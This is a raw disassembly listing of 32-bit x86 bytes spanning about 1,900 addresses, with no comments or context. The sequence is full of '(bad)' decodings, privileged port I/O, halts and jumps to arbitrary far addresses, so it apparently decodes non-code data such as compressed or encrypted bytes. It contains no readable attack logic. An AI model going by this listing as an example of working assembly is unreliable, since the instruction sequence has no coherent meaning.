  41c173:	inc    esp
  41c174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c175:	push   edi
  41c176:	sti    
  41c177:	dec    esp
  41c178:	push   ebp
  41c179:	out    0x5d,eax
  41c17b:	pop    ebx
  41c17c:	jg     0x41c1f0
  41c17e:	in     al,0xea
  41c180:	cld    
  41c181:	fistp  DWORD PTR [edi-0x290af02a]
  41c187:	jb     0x41c189
  41c189:	ins    BYTE PTR es:[edi],dx
  41c18a:	aam    0xb3
  41c18c:	fild   QWORD PTR [edi]
  41c18e:	data16 loop 0x41c13c
  41c191:	jae    0x41c17e
  41c193:	popa   
  41c194:	push   esp
  41c195:	adc    eax,0x224e47ae
  41c19a:	push   ss
  41c19b:	cmp    edx,edi
  41c19d:	mov    ebx,0xce2e3038
  41c1a2:	(bad)  
  41c1a3:	jnp    0x41c1f7
  41c1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1a6:	scas   al,BYTE PTR es:[edi]
  41c1a7:	es hlt 
  41c1a9:	mov    esp,0xfac1f680
  41c1ae:	push   0x6
  41c1b0:	je     0x41c140
  41c1b2:	mov    eax,DWORD PTR ds:0xe06a3134
  41c1b8:	leave  
  41c1b9:	dec    ebp
  41c1ba:	and    BYTE PTR [edx-0x20],dl
  41c1bd:	inc    ebx
  41c1be:	mov    bh,0x78
  41c1c0:	xchg   BYTE PTR [esi-0x6311f7c9],bh
  41c1c6:	xchg   esp,eax
  41c1c7:	fcomp  QWORD PTR [edx-0x10429d41]
  41c1cd:	mov    al,0xaf
  41c1cf:	inc    edx
  41c1d0:	(bad)  
  41c1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1d2:	jb     0x41c195
  41c1d4:	mov    al,0x78
  41c1d6:	or     bh,BYTE PTR [edx+0x25741e75]
  41c1dc:	cmp    al,0x7
  41c1de:	push   eax
  41c1df:	repnz dec ebp
  41c1e1:	in     eax,dx
  41c1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1e3:	jmp    0x6dcd5249
  41c1e8:	mov    ch,0xdc
  41c1ea:	push   ds
  41c1eb:	fdiv   QWORD PTR [ebp-0x73]
  41c1ee:	mov    edx,0x88618f3b
  41c1f3:	xor    DWORD PTR ds:0x1a484cc,ebp
  41c1f9:	jnp    0x41c1f9
  41c1fb:	in     eax,dx
  41c1fc:	push   esi
  41c1fd:	xchg   ecx,eax
  41c1fe:	lahf   
  41c1ff:	dec    ebp
  41c200:	fild   QWORD PTR [edx-0x7d7100e8]
  41c206:	dec    edi
  41c207:	ins    DWORD PTR es:[edi],dx
  41c208:	fld    DWORD PTR ds:0x7f68b26f
  41c20e:	xchg   edi,eax
  41c20f:	call   0x22fb6658
  41c214:	sbb    DWORD PTR [ebx+0x3bec6d4a],ebp
  41c21a:	std    
  41c21b:	xor    ecx,eax
  41c21d:	jecxz  0x41c29c
  41c21f:	stos   BYTE PTR es:[edi],al
  41c220:	sbb    al,0x58
  41c222:	mov    ebp,0xed5dbab3
  41c227:	pop    ebx
  41c228:	loope  0x41c299
  41c22a:	jne    0x41c1e1
  41c22c:	cmp    BYTE PTR [edi+0x57d1fad1],al
  41c232:	inc    ebp
  41c233:	mov    ch,0xbc
  41c235:	dec    edi
  41c236:	mov    esi,0xcd62b881
  41c23b:	shr    eax,cl
  41c23d:	inc    ebp
  41c23e:	stos   DWORD PTR es:[edi],eax
  41c23f:	pop    ecx
  41c240:	ins    BYTE PTR es:[edi],dx
  41c241:	xchg   edi,eax
  41c242:	mov    al,0x9c
  41c244:	push   ds
  41c245:	sub    dl,BYTE PTR ds:0x5e23a83d
  41c24b:	pop    ebx
  41c24c:	(bad)  
  41c24d:	lods   eax,DWORD PTR ds:[esi]
  41c24e:	ret    0x4f41
  41c251:	aam    0x21
  41c253:	inc    ebp
  41c254:	adc    eax,DWORD PTR [ecx-0x596109]
  41c25a:	aam    0xd5
  41c25c:	push   ebx
  41c25d:	pop    ebp
  41c25e:	jle    0x41c215
  41c260:	adc    BYTE PTR [ecx+edi*2],ah
  41c263:	ret    0xd336
  41c266:	sub    DWORD PTR [esi],esi
  41c268:	xchg   DWORD PTR [eax],edi
  41c26a:	mov    eax,0xfc4975f7
  41c26f:	xchg   DWORD PTR [eax+0x71a51dd5],edx
  41c275:	clc    
  41c276:	and    eax,0xbd19e2ba
  41c27b:	dec    esi
  41c27c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c27d:	ret    
  41c27e:	in     al,dx
  41c27f:	pop    es
  41c280:	jmp    0x41c294
  41c282:	das    
  41c283:	cmp    al,0x2e
  41c285:	or     ebx,DWORD PTR [edi]
  41c287:	mov    dh,0x8b
  41c289:	or     eax,0x731f4bd
  41c28e:	mov    eax,esp
  41c290:	xor    bl,dl
  41c292:	ficomp DWORD PTR [eax]
  41c294:	rcl    bh,cl
  41c296:	or     edi,DWORD PTR [edx+ebp*8-0x3ea1bec1]
  41c29d:	sub    eax,0xcb39f6e8
  41c2a2:	idiv   DWORD PTR [ecx]
  41c2a4:	mov    BYTE PTR ds:0xefb0571b,dl
  41c2aa:	mov    al,BYTE PTR [ebp+0x3e57d996]
  41c2b0:	jno    0x41c246
  41c2b2:	adc    DWORD PTR [edx],0xfffffff9
  41c2b5:	clc    
  41c2b6:	out    0x2e,al
  41c2b8:	(bad)  
  41c2b9:	push   0x68
  41c2bb:	xor    eax,0x2f369b2
  41c2c0:	aad    0x97
  41c2c2:	or     eax,0x1d1328f7
  41c2c7:	pop    ss
  41c2c8:	jbe    0x41c276
  41c2ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2cb:	(bad)  
  41c2cd:	or     esp,DWORD PTR [eax]
  41c2cf:	inc    ecx
  41c2d0:	mov    eax,ss:0x95050bca
  41c2d6:	mov    edx,0xd00498a1
  41c2db:	jl     0x41c355
  41c2dd:	dec    esi
  41c2de:	test   BYTE PTR [ebp-0x77],cl
  41c2e1:	cmp    al,0xf6
  41c2e3:	in     eax,dx
  41c2e4:	sbb    eax,0x24e31557
  41c2e9:	hlt    
  41c2ea:	gs bnd jb 0x41c29e
  41c2ee:	ja     0x41c366
  41c2f0:	mov    WORD PTR [edi],cs
  41c2f2:	cld    
  41c2f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2f4:	jp     0x41c277
  41c2f6:	push   cs
  41c2f7:	jle    0x41c303
  41c2f9:	mov    ebx,0xf1c1b1f4
  41c2fe:	(bad)  
  41c300:	fild   DWORD PTR [ebx+edi*8-0x77]
  41c304:	fcomp  QWORD PTR [ecx-0x14]
  41c307:	mov    bh,0x99
  41c309:	or     al,0xdf
  41c30b:	int3   
  41c30c:	pop    ds
  41c30d:	ins    DWORD PTR es:[edi],dx
  41c30e:	xchg   bh,al
  41c310:	test   BYTE PTR [esp+ebx*4-0x45],ah
  41c314:	test   ecx,edi
  41c316:	lods   eax,DWORD PTR ds:[esi]
  41c317:	mov    WORD PTR [eax],?
  41c319:	cmp    BYTE PTR [ecx*2+0x6ce89b50],ch
  41c320:	in     al,dx
  41c321:	mov    ah,0xad
  41c323:	(bad)  
  41c325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c326:	jmp    0x9070:0x874d0b1e
  41c32d:	daa    
  41c32e:	xor    edx,DWORD PTR [edi-0x62]
  41c331:	loopne 0x41c359
  41c333:	lock cwde 
  41c335:	and    eax,0x44ffaef6
  41c33a:	inc    edi
  41c33b:	add    ebx,DWORD PTR [eax-0x1b671cdc]
  41c341:	(bad)  
  41c342:	outs   dx,DWORD PTR ds:[esi]
  41c343:	retf   
  41c344:	dec    esp
  41c345:	shr    BYTE PTR [edx+edx*4],0xb5
  41c349:	in     eax,0xb
  41c34b:	sbb    DWORD PTR [edi-0x4da1e9f8],esi
  41c351:	sub    DWORD PTR [ecx+ebp*1-0x70],esi
  41c355:	pushf  
  41c356:	sahf   
  41c357:	xchg   ebp,eax
  41c358:	mov    edx,0x48aca1fb
  41c35d:	mov    ebx,0x8df3ff90
  41c362:	push   0x28
  41c364:	dec    edx
  41c365:	retf   0x988c
  41c368:	adc    BYTE PTR [eax-0x3c59879c],ch
  41c36e:	mov    edi,0x30ac1156
  41c373:	fadd   st(7),st
  41c375:	mov    eax,0xa776a536
  41c37a:	cmp    DWORD PTR ds:0x8b11c36,eax
  41c380:	push   edx
  41c381:	mov    dh,0xd
  41c383:	icebp  
  41c384:	in     eax,dx
  41c385:	or     ebp,DWORD PTR [edi+edx*4]
  41c388:	daa    
  41c389:	mov    cl,0xe
  41c38b:	xor    BYTE PTR [edx],ah
  41c38d:	pop    ebp
  41c38e:	sbb    dl,0xa0
  41c391:	es sbb al,0x67
  41c394:	aad    0x54
  41c396:	test   DWORD PTR [ebp+0x3857f915],ebp
  41c39c:	icebp  
  41c39d:	retf   0x65e5
  41c3a0:	pop    es
  41c3a1:	add    al,0xed
  41c3a3:	sar    BYTE PTR [ebx-0x409a07df],cl
  41c3a9:	xor    DWORD PTR [eax],ecx
  41c3ab:	cmp    dh,BYTE PTR ds:[edx-0x9ea7c0c]
  41c3b2:	sbb    eax,0x16a63f40
  41c3b7:	sbb    dl,BYTE PTR [eax]
  41c3b9:	pop    ss
  41c3ba:	mov    ch,0x5e
  41c3bc:	mov    bl,0xd5
  41c3be:	mov    edx,0xdef6156c
  41c3c3:	xchg   edi,eax
  41c3c4:	cmp    bh,BYTE PTR ds:0x3898d18d
  41c3ca:	sbb    bh,BYTE PTR [esi+0x235b6d27]
  41c3d0:	dec    edx
  41c3d1:	in     eax,0x4d
  41c3d3:	leave  
  41c3d4:	stos   DWORD PTR es:[edi],eax
  41c3d5:	iret   
  41c3d6:	push   ecx
  41c3d7:	sub    ebp,DWORD PTR fs:[ecx+0x24ffaedf]
  41c3de:	or     eax,edx
  41c3e0:	pushf  
  41c3e1:	dec    ebx
  41c3e2:	pop    esp
  41c3e3:	stos   BYTE PTR es:[edi],al
  41c3e4:	lock mov bh,0xa1
  41c3e7:	pop    DWORD PTR [ebx+0x2a]
  41c3ea:	jbe    0x41c37d
  41c3ec:	sub    dl,bl
  41c3ee:	dec    esi
  41c3ef:	adc    BYTE PTR [ecx+0x59],al
  41c3f2:	retf   0x3963
  41c3f5:	sbb    eax,0x591c74d8
  41c3fa:	icebp  
  41c3fb:	pushf  
  41c3fc:	add    DWORD PTR [edx-0x4827697],edx
  41c402:	mov    ecx,0xcbdd0479
  41c407:	mov    ds:0x39198b5c,eax
  41c40c:	iret   
  41c40d:	(bad)  
  41c40e:	push   0xb552c003
  41c413:	mov    al,0x96
  41c415:	stos   DWORD PTR es:[edi],eax
  41c416:	inc    ecx
  41c417:	mov    dl,0xe1
  41c419:	adc    eax,0xdf9444da
  41c41e:	xor    BYTE PTR [ecx+edi*4-0x95629cb],dl
  41c425:	cmp    al,BYTE PTR [ebp-0x4cb7659f]
  41c42b:	jmp    ecx
  41c42d:	jge    0x41c477
  41c42f:	test   eax,0x38578449
  41c434:	sbb    eax,edx
  41c436:	jns    0x41c3e9
  41c438:	jmp    0x1790c0f6
  41c43d:	rcl    ebp,cl
  41c43f:	inc    ebx
  41c440:	adc    eax,0x765c3104
  41c445:	gs popf 
  41c447:	dec    edx
  41c448:	adc    DWORD PTR ds:0x3e9f0828,ecx
  41c44e:	out    dx,al
  41c44f:	push   cs
  41c450:	sbb    al,0xc0
  41c452:	dec    esi
  41c453:	or     eax,0x344d29c0
  41c458:	scas   al,BYTE PTR es:[edi]
  41c459:	in     al,0xbc
  41c45b:	test   eax,0x73aca1e5
  41c460:	pusha  
  41c461:	mov    eax,ds:0xfaea7936
  41c466:	mov    dh,0x99
  41c468:	sbb    al,0xf9
  41c46a:	jnp    0x41c46a
  41c46c:	int3   
  41c46d:	loop   0x41c4da
  41c46f:	lock add al,0x16
  41c472:	pusha  
  41c473:	int3   
  41c474:	outs   dx,BYTE PTR ds:[esi]
  41c475:	push   ebp
  41c476:	inc    ebp
  41c477:	nop
  41c478:	pop    es
  41c479:	call   0xb3446065
  41c47e:	pop    edi
  41c47f:	retf   0x58da
  41c482:	dec    ebp
  41c483:	mov    bl,0x15
  41c485:	sub    BYTE PTR [eax],dl
  41c487:	fdiv   QWORD PTR [ebp-0x287ec69e]
  41c48d:	stos   DWORD PTR es:[edi],eax
  41c48e:	inc    edx
  41c48f:	dec    ebx
  41c490:	loop   0x41c4f4
  41c492:	jno    0x41c492
  41c494:	int    0x81
  41c496:	sbb    eax,0x7297423e
  41c49b:	inc    ebx
  41c49c:	scas   al,BYTE PTR es:[edi]
  41c49d:	push   esi
  41c49e:	and    edx,DWORD PTR [ecx]
  41c4a0:	mov    esi,0x125d9b74
  41c4a5:	jmp    0x41c4b9
  41c4a7:	dec    edi
  41c4a8:	pop    edi
  41c4a9:	xlat   BYTE PTR ds:[ebx]
  41c4aa:	sbb    esp,DWORD PTR [eax-0x4]
  41c4ad:	je     0x41c44f
  41c4af:	add    DWORD PTR [esi-0x1d],0x564170e0
  41c4b6:	dec    BYTE PTR [ecx+0x12]
  41c4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4ba:	sbb    DWORD PTR [eax],eax
  41c4bc:	mov    al,ds:0x588ec2bb
  41c4c1:	hlt    
  41c4c2:	lock lods eax,DWORD PTR ds:[esi]
  41c4c4:	pop    ecx
  41c4c5:	or     DWORD PTR ds:0x22273c1f,0x4d285ad
  41c4cf:	cmp    eax,0x467d4cc5
  41c4d4:	in     eax,dx
  41c4d5:	pop    ebp
  41c4d6:	les    ebp,FWORD PTR [ecx+eax*8]
  41c4d9:	fsub   QWORD PTR [ebp+0x16]
  41c4dc:	imul   ebp,esi,0xfffffff2
  41c4df:	push   edi
  41c4e0:	mov    ebp,0x8e10aeb7
  41c4e5:	call   0xc33a:0x8248c94e
  41c4ec:	jmp    0x7ef8901d
  41c4f1:	std    
  41c4f2:	adc    eax,0x6a43a22a
  41c4f7:	mov    ecx,DWORD PTR [esi]
  41c4f9:	cmp    al,0x42
  41c4fb:	or     eax,0xaee23340
  41c500:	xchg   ecx,eax
  41c501:	sbb    eax,0x36d90bee
  41c506:	jmp    0x41c53c
  41c508:	(bad)
  41c50b:	mov    ebp,DWORD PTR [ebp+esi*1-0x6dfdc7f4]
  41c512:	inc    ebx
  41c513:	rcr    BYTE PTR [edx],cl
  41c515:	pop    ds
  41c516:	adc    al,0x93
  41c518:	xchg   esp,eax
  41c519:	ret    0xd889
  41c51c:	mov    ecx,0x310d02ff
  41c521:	mov    ds:0x391ccaf9,eax
  41c526:	add    cl,BYTE PTR [ebp+0x26]
  41c529:	mov    BYTE PTR [eax],bh
  41c52b:	adc    edi,0x7271e451
  41c531:	outs   dx,BYTE PTR ds:[esi]
  41c532:	fistp  QWORD PTR [edi+0x444fb015]
  41c538:	xchg   ecx,eax
  41c539:	pop    esp
  41c53a:	mov    esp,0x6db2864f
  41c53f:	dec    ebx
  41c540:	push   ds
  41c541:	xlat   BYTE PTR ds:[ebx]
  41c542:	sbb    DWORD PTR [ecx-0x4303f89a],edx
  41c548:	inc    eax
  41c549:	enter  0x90fa,0xcb
  41c54d:	sub    BYTE PTR [ecx-0xd19d3b1],ch
  41c553:	inc    edi
  41c554:	add    ah,BYTE PTR [edx+0x40e558d6]
  41c55a:	pop    esp
  41c55b:	loope  0x41c548
  41c55d:	ss iret 
  41c55f:	xor    BYTE PTR [ebp-0x70],0x91
  41c563:	jb     0x41c53a
  41c565:	add    ebx,ebx
  41c567:	gs dec eax
  41c569:	fiadd  WORD PTR [esi-0x13]
  41c56c:	mov    DWORD PTR ds:0x276417a4,ebp
  41c572:	lods   al,BYTE PTR ds:[esi]
  41c573:	and    eax,0xfcc17a5f
  41c578:	das    
  41c579:	psubw  mm4,QWORD PTR [esi-0x35]
  41c57d:	cwde   
  41c57e:	mov    al,0xbb
  41c580:	xabort 0x17
  41c583:	mov    edi,0x3a249550
  41c588:	int    0x40
  41c58a:	add    ch,BYTE PTR [eax-0xe]
  41c58d:	or     esp,DWORD PTR [edx]
  41c58f:	retf   
  41c590:	fisttp WORD PTR [eax+eax*1]
  41c593:	fwait
  41c594:	call   0x7b0a:0x36fc88a2
  41c59b:	out    0xda,eax
  41c59d:	neg    al
  41c59f:	ins    BYTE PTR es:[edi],dx
  41c5a0:	lahf   
  41c5a1:	test   BYTE PTR [edx],ah
  41c5a3:	stc    
  41c5a4:	(bad)  
  41c5a5:	dec    ecx
  41c5a6:	cld    
  41c5a7:	iret   
  41c5a8:	pusha  
  41c5a9:	sbb    edx,edx
  41c5ab:	mov    esi,DWORD PTR [edx-0x1b61d920]
  41c5b1:	retf   0xccc5
  41c5b4:	adc    al,0xe3
  41c5b6:	push   edx
  41c5b7:	adc    ah,BYTE PTR [esi+0x63]
  41c5ba:	les    edx,FWORD PTR [ebx]
  41c5bc:	xor    eax,0x463499f5
  41c5c1:	or     dl,dh
  41c5c3:	stos   BYTE PTR es:[edi],al
  41c5c4:	adc    BYTE PTR [edx+ebx*4-0x8],cl
  41c5c8:	inc    edx
  41c5c9:	inc    ebp
  41c5ca:	push   eax
  41c5cb:	inc    esp
  41c5cc:	loopne 0x41c587
  41c5ce:	xchg   ebp,eax
  41c5cf:	adc    ebx,DWORD PTR [ebx]
  41c5d1:	xchg   edx,eax
  41c5d2:	inc    ecx
  41c5d3:	int3   
  41c5d4:	sbb    eax,0xe701a935
  41c5d9:	(bad)  
  41c5da:	or     eax,0xb686d560
  41c5df:	hlt    
  41c5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5e1:	xchg   DWORD PTR [ebx+0x53fd4f13],esi
  41c5e7:	mov    esi,0x1bfddd5b
  41c5ec:	stos   BYTE PTR es:[edi],al
  41c5ed:	test   edx,esi
  41c5ef:	jmp    DWORD PTR [edi]
  41c5f1:	retf   
  41c5f2:	arpl   WORD PTR [esi+0x2fd8c974],ax
  41c5f8:	js     0x41c5ce
  41c5fa:	cmp    ah,BYTE PTR [edi]
  41c5fc:	cmc    
  41c5fd:	xchg   esp,eax
  41c5fe:	popa   
  41c5ff:	push   edi
  41c600:	js     0x41c654
  41c602:	mov    ebp,DWORD PTR [esi]
  41c604:	aad    0x77
  41c606:	ins    BYTE PTR es:[edi],dx
  41c607:	jmp    0x41c639
  41c609:	dec    eax
  41c60a:	gs js  0x41c67c
  41c60d:	xor    bh,BYTE PTR [ecx]
  41c60f:	test   bh,dh
  41c611:	cmp    BYTE PTR [ecx+0x4c8e6d4a],ch
  41c617:	push   edi
  41c618:	inc    ebp
  41c619:	ret    
  41c61a:	lods   eax,DWORD PTR ds:[esi]
  41c61b:	jmp    0x89eb:0xb3acd36e
  41c622:	aad    0xd0
  41c624:	mov    ebp,0xa453effa
  41c629:	pop    esi
  41c62a:	pushf  
  41c62b:	(bad)  
  41c62c:	sub    dh,BYTE PTR [edi]
  41c62e:	sub    ebx,0x4da96c8a
  41c634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c635:	add    ch,BYTE PTR [edx]
  41c637:	imul   ecx,eax,0xd89bfc96
  41c63d:	adc    ebx,DWORD PTR [edx+0xa]
  41c640:	data16 (bad) 
  41c642:	out    dx,eax
  41c643:	add    eax,DWORD PTR [ecx]
  41c645:	xor    DWORD PTR [ebx],ebp
  41c647:	or     bl,dl
  41c649:	in     al,0x3
  41c64b:	test   esp,edx
  41c64d:	jmp    0x41c61d
  41c64f:	addr16 je 0x41c665
  41c652:	xor    edi,DWORD PTR [esi]
  41c654:	je     0x41c685
  41c656:	adc    eax,0xf7603757
  41c65b:	xchg   esi,eax
  41c65c:	pop    eax
  41c65d:	inc    ebx
  41c65e:	xlat   BYTE PTR ds:[ebx]
  41c65f:	out    dx,eax
  41c660:	xor    al,0xc1
  41c662:	mov    ch,0x62
  41c664:	inc    eax
  41c665:	xchg   esi,eax
  41c666:	(bad)
  41c669:	call   0x323a:0xec684384
  41c670:	es loope 0x41c6d5
  41c673:	jno    0x41c620
  41c675:	xchg   ecx,eax
  41c676:	lea    edi,[ebx-0x57]
  41c679:	inc    ecx
  41c67a:	inc    esi
  41c67b:	inc    ebp
  41c67c:	xchg   DWORD PTR [eax+0x11],ebp
  41c67f:	push   ss
  41c680:	inc    esp
  41c681:	repnz cmp edx,DWORD PTR [edx+0x6c2cde4f]
  41c688:	xchg   ecx,eax
  41c689:	pusha  
  41c68a:	(bad)  
  41c68b:	xlat   BYTE PTR ds:[ebx]
  41c68c:	mov    eax,0xbe3e631
  41c691:	adc    al,0xd2
  41c693:	and    al,0xff
  41c695:	and    al,ch
  41c697:	mov    edi,0x97661308
  41c69c:	dec    edi
  41c69d:	mov    ecx,0xd331b322
  41c6a2:	out    dx,eax
  41c6a3:	in     eax,0x6f
  41c6a5:	test   ah,ah
  41c6a7:	sub    eax,0x7556e67e
  41c6ac:	cmp    edi,0x1ddf9387
  41c6b2:	popf   
  41c6b3:	je     0x41c6bb
  41c6b5:	cmp    eax,0xa147bbb1
  41c6ba:	ds dec eax
  41c6bc:	out    0xd,al
  41c6be:	dec    edx
  41c6bf:	jle    0x41c663
  41c6c1:	shl    edi,cl
  41c6c3:	jno    0x41c6ad
  41c6c5:	pushf  
  41c6c6:	pop    ebp
  41c6c7:	lahf   
  41c6c8:	test   al,0xf2
  41c6ca:	push   es
  41c6cb:	lds    ecx,FWORD PTR [eax+ecx*4-0x37]
  41c6cf:	arpl   WORD PTR [esi+0x65],di
  41c6d2:	xchg   edi,eax
  41c6d3:	test   eax,0x6823a5a7
  41c6d8:	imul   ecx,DWORD PTR [ebp+0xa],0xffffffe3
  41c6dc:	mov    eax,0x824e214d
  41c6e1:	out    dx,eax
  41c6e2:	and    eax,0xdbaec2f9
  41c6e7:	jmp    0x41c692
  41c6e9:	sbb    bh,dl
  41c6eb:	push   ds
  41c6ec:	jmp    0x6ffb:0xe1813452
  41c6f3:	dec    eax
  41c6f4:	gs jg  0x41c712
  41c6f7:	xor    bh,BYTE PTR [edx-0x21]
  41c6fa:	adc    al,0xef
  41c6fc:	xor    bl,BYTE PTR [ecx+0x39eb4963]
  41c702:	mov    ds:0xd058d05d,al
  41c707:	push   ecx
  41c708:	ret    
  41c709:	or     BYTE PTR [ecx-0x2ac14aff],0xb7
  41c710:	cmp    eax,0xbebaf0e
  41c715:	mov    ebx,0xb0f693b3
  41c71a:	mov    ds:0x1bc83141,eax
  41c71f:	jg     0x41c75f
  41c721:	das    
  41c722:	rol    BYTE PTR [edx+0x6faec398],1
  41c728:	mov    ecx,ecx
  41c72a:	out    0x70,eax
  41c72c:	push   edx
  41c72d:	jmp    0x41c6fa
  41c72f:	mov    edx,0x74e3463e
  41c734:	cmp    dl,BYTE PTR [ebp+0x47e09fe2]
  41c73a:	leave  
  41c73b:	push   ss
  41c73c:	nop
  41c73d:	fist   WORD PTR [edx-0x4b]
  41c740:	ss fwait
  41c742:	xchg   esp,eax
  41c743:	cmc    
  41c744:	test   ebx,esp
  41c746:	and    BYTE PTR [esi+0x233d3990],bl
  41c74c:	lahf   
  41c74d:	xor    al,0xdf
  41c74f:	cmp    ebp,DWORD PTR [ecx+0x14]
  41c752:	gs push edi
  41c754:	shl    DWORD PTR [esi-0x5cac8ebd],0x74
  41c75b:	loope  0x41c7ad
  41c75d:	jl     0x41c74e
  41c75f:	jge    0x41c754
  41c761:	inc    edx
  41c762:	mov    ecx,0x1e354a57
  41c767:	stc    
  41c768:	rep outs dx,DWORD PTR ds:[esi]
  41c76a:	lds    ebx,FWORD PTR [esi-0x3a7d56f8]
  41c770:	push   edi
  41c771:	out    0xf0,eax
  41c773:	mov    ecx,0x7203d65a
  41c778:	(bad)  
  41c779:	dec    eax
  41c77a:	dec    esp
  41c77b:	out    0x8,al
  41c77d:	out    0xa1,al
  41c77f:	push   cs
  41c780:	jmp    0x6fe8:0x919af06a
  41c787:	sbb    ah,bl
  41c789:	mov    DWORD PTR [ebx],ebx
  41c78b:	mov    ah,0x6a
  41c78d:	or     eax,0x79787b7e
  41c792:	int3   
  41c793:	xchg   esi,eax
  41c794:	mov    cl,0x7c
  41c796:	inc    ebp
  41c797:	dec    ebx
  41c798:	mov    bh,0x11
  41c79a:	enter  0x14c1,0x60
  41c79e:	enter  0x1b15,0x86
  41c7a2:	pop    ss
  41c7a3:	jbe    0x41c80a
  41c7a5:	jecxz  0x41c748
  41c7a7:	popa   
  41c7a8:	jae    0x41c7e9
  41c7aa:	lea    ebx,[esi+0x64]
  41c7ad:	gs xchg ebp,eax
  41c7af:	jp     0x532ff375
  41c7b5:	(bad)
  41c7b8:	(bad)  
  41c7b9:	int    0x3e
  41c7bb:	jbe    0x41c7ae
  41c7bd:	test   al,0x5c
  41c7bf:	add    ah,0xd5
  41c7c2:	inc    esi
  41c7c3:	jge    0x41c7f5
  41c7c5:	(bad)  
  41c7c6:	xor    al,0x82
  41c7c8:	fst    DWORD PTR [ebx]
  41c7ca:	in     al,dx
  41c7cb:	adc    ecx,ecx
  41c7cd:	mov    esp,0xe8b5b03c
  41c7d2:	mov    ch,0xea
  41c7d4:	or     BYTE PTR [esi],0x1c
  41c7d7:	cld    
  41c7d8:	xchg   ecx,eax
  41c7d9:	dec    edi
  41c7da:	in     al,dx
  41c7db:	data16 ja 0x41c7d1
  41c7de:	sti    
  41c7df:	mov    ah,0x15
  41c7e1:	popf   
  41c7e2:	xchg   ebp,eax
  41c7e3:	sub    BYTE PTR ds:0xec8f4fc2,ch
  41c7e9:	and    ch,BYTE PTR [eax+0x59]
  41c7ec:	mov    DWORD PTR [edi+0x6],ebp
  41c7ef:	cmp    BYTE PTR [ebp-0x2efc4567],al
  41c7f5:	sub    ecx,DWORD PTR [ecx-0x1505187e]
  41c7fb:	lea    ebx,[esp+edx*1]
  41c7fe:	lock jp 0x41c781
  41c801:	jp     0x41c844
  41c803:	add    al,0x66
  41c805:	mov    ?,WORD PTR [edi-0x3f]
  41c808:	cmp    ah,dl
  41c80a:	retf   0xfd15
  41c80d:	dec    ebp
  41c80e:	or     DWORD PTR [edi+eax*4+0x1d124039],ebp
  41c815:	mov    dh,0x3d
  41c817:	fs inc edx
  41c819:	es std 
  41c81b:	and    esp,DWORD PTR [edi+0x778cb7d2]
  41c821:	pop    eax
  41c822:	add    edx,edx
  41c824:	dec    ebp
  41c825:	cdq    
  41c826:	std    
  41c827:	bound  esi,QWORD PTR [edx-0x1bb4b08b]
  41c82d:	mov    ch,0xc1
  41c82f:	je     0x41c882
  41c831:	stos   DWORD PTR es:[edi],eax
  41c832:	jbe    0x41c864
  41c834:	cmp    eax,0x8bdeafed
  41c839:	mov    eax,ds:0x5841e844
  41c83e:	jmp    0x518901f
  41c843:	es push ecx
  41c845:	in     al,dx
  41c846:	or     ecx,DWORD PTR [ebx+0x2e]
  41c849:	sbb    ah,BYTE PTR [ecx-0xf20cc48]
  41c84f:	mov    ss,WORD PTR [edx]
  41c851:	sub    DWORD PTR ds:0xd7d0479d,ebx
  41c857:	push   esi
  41c858:	(bad)  
  41c859:	lock es ins BYTE PTR es:[edi],dx
  41c85c:	in     al,0x6
  41c85e:	mov    ds:0x3c8e7f08,eax
  41c863:	and    eax,0x5d0afcaf
  41c868:	stc    
  41c869:	cmp    BYTE PTR [ebp-0x5a],al
  41c86c:	or     edi,DWORD PTR [esp+edi*2-0x388a5b75]
  41c873:	jg     0x41c84d
  41c875:	lahf   
  41c876:	pop    ebx
  41c877:	push   es
  41c878:	inc    esi
  41c879:	inc    DWORD PTR [edx+ebx*2]
  41c87c:	mov    al,0xc0
  41c87e:	push   edi
  41c87f:	int    0x2d
  41c881:	and    DWORD PTR [ebp+0x2d],0x25
  41c885:	push   eax
  41c887:	cmp    BYTE PTR [edx+0x2a],0x1b
  41c88b:	cmp    ebp,DWORD PTR [eax-0x3cc690d1]
  41c891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c892:	sub    eax,DWORD PTR ds:0xe438d71b
  41c898:	enter  0x3d40,0x77
  41c89c:	outs   dx,DWORD PTR ds:[esi]
  41c89d:	jb     0x41c895
  41c89f:	dec    esi
  41c8a0:	cld    
  41c8a1:	jno    0x41c830
  41c8a3:	push   ebp
  41c8a4:	sub    esp,ebx
  41c8a6:	or     BYTE PTR [ecx],bh
  41c8a8:	or     al,0xe9
  41c8aa:	mov    ecx,edx
  41c8ac:	xor    DWORD PTR [eax-0x2d],ebp
  41c8af:	and    al,BYTE PTR [ecx-0x2bf21db0]
  41c8b5:	and    eax,0xbef18560
  41c8ba:	outs   dx,DWORD PTR ds:[esi]
  41c8bb:	in     eax,dx
  41c8bc:	ja     0x41c8f4
  41c8be:	inc    ecx
  41c8bf:	adc    BYTE PTR ds:0x36be35cd,al
  41c8c5:	cmp    al,0x50
  41c8c7:	xchg   edx,eax
  41c8c8:	(bad)  
  41c8c9:	cmp    al,0xd0
  41c8cb:	retf   
  41c8cc:	pop    ecx
  41c8cd:	push   ebp
  41c8ce:	in     al,0x73
  41c8d0:	pusha  
  41c8d1:	fld    QWORD PTR [eax+eiz*4+0x449d8444]
  41c8d8:	cs out dx,eax
  41c8da:	or     bl,dl
  41c8dc:	mov    esi,0x41845545
  41c8e1:	mov    eax,ds:0x2fc4a170
  41c8e6:	jl     0x41c91f
  41c8e8:	sub    al,0xd6
  41c8ea:	stos   DWORD PTR es:[edi],eax
  41c8eb:	sub    BYTE PTR [edx],bl
  41c8ed:	les    ebp,FWORD PTR [edi+0x8]
  41c8f0:	ss xchg ecx,eax
  41c8f2:	shl    DWORD PTR [esi+0x238724ad],0x56
  41c8f9:	mov    cl,0x79
  41c8fb:	outs   dx,DWORD PTR ss:[esi]
  41c8fd:	stos   BYTE PTR es:[edi],al
  41c8fe:	pushf  
